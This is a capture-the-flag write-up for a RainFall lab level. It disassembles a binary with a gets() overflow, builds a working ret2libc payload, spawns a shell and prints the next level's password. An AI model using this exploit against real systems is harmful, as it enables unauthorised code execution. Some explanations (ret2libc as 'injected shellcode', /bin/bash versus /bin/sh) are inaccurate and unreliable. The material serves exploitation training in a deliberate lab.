# Level2

## Exploring the binary
```shell
level2@RainFall:~$ ./level2
phantom
phantom
level2@RainFall:~$ ./level2
FFFF FFF
FFFF FFF
```
The <code>level2</code> binary waits for standard input and then prints it out.

## GDB analysis
```shell
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:		push   %ebp
   0x08048540 <+1>:		mov    %esp,%ebp
   0x08048542 <+3>:		and    $0xfffffff0,%esp
   0x08048545 <+6>:		call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
```
The main function calls <code>p()</code> upon execution. This makes us wonder if there are other functions that haven't been called.
```shell
(gdb) i function
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x080483a0  printf
0x080483a0  printf@plt
0x080483b0  fflush
0x080483b0  fflush@plt
0x080483c0  gets
0x080483c0  gets@plt
0x080483d0  _exit
0x080483d0  _exit@plt
0x080483e0  strdup
0x080483e0  strdup@plt
0x080483f0  puts
0x080483f0  puts@plt
0x08048400  __gmon_start__
0x08048400  __gmon_start__@plt
0x08048410  __libc_start_main
0x08048410  __libc_start_main@plt
0x08048420  _start
0x08048450  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484d4  p
0x0804853f  main
0x08048550  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c2  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini
```
As we've seen again before, the function <code>p()</code> utilizes the unsafe <code>gets()</code> function, which is vulnerable to buffer overflow attacks.
```shell
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:		push   %ebp
   0x080484d5 <+1>:		mov    %esp,%ebp
   0x080484d7 <+3>:		sub    $0x68,%esp
   0x080484da <+6>:		mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```
This time, there is no direct <code>system()</code> call, so we may need to find our own way to access it. This situation is commonly referred to as a <code>return to libc</code> attack, where the overflow overwrites the return address with the memory address of the injected shellcode. Upon returning from the function, instead of jumping to the legitimate address, it redirects execution flow to the shellcode.


## ret2libc
There are 3 prerequisites for planning this type of attack:
- <code>system()</code> - which allows executing shell commands
- <code>exit()</code> - used to terminate the program after executing the shell command
- <code>/bin/bash</code> - which is passed as an argument to <code>system()</code> to spawn a shell

``` shell
overflow --> return from p() ? --EXPLOIT--> system() --> exit() --> /bin/bash
```

It might seem weird that the <code>/bin/bash</code> comes after <code>exit()</code>. When a program is compiled and linked, functions like <code>system()</code> and <code>exit()</code> from the libc are typically located before any static data such as strings. Therefore, the address of the <code>exit()</code> function usually comes before the address of the <code>/bin/bash</code> string in memory.

The offset is found in the same manner as before, with a value of 80. We determine the addresses of the functions and commands using <code>GDB</code>:
``` shell
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) r
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) find 0xb7e6b060, +999999999, "/bin/sh"
0xb7f8cc58
```

## Exploit
The exploit is constructed using the addresses and overflow in the following order:
1. Offset of 80 bytes.
2. Return address from function <code>p()</code> (0x0804853e).
3. <code>system()</code> address (0xb7e6b060).
4. <code>exit()</code> address (0xb7e5ebe0).
5. <code>/bin/bash</code> address (0xb7f8cc58).

``` shell
level2@RainFall:~$ python -c 'print "F" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1]' > /tmp/flag2
level2@RainFall:~$ cat /tmp/flag2 - | ./level2
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF>FFFFFFFFFFFF>`�����X���
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
